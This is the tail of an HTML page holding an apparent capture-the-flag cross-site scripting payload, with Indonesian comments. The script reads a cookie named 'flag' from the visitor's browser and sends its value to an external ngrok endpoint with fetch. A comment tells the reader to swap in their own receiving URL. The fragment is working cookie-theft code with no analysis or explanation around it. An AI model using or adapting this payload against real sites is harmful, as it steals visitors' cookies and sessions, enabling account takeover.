            // Mengambil cookie dengan nama 'flag'
            const flag = document.cookie.match(/flag=([^;]+)/);
            if (flag) {
                // Ganti dengan URL endpoint Anda sendiri untuk menerima flag
                fetch('https://0bcb-180-252-62-25.ngrok-free.app/storeflag?flag=' + encodeURIComponent(flag[1]), {
                    method: 'GET'
                });
            }
        });
    </script>

</body>
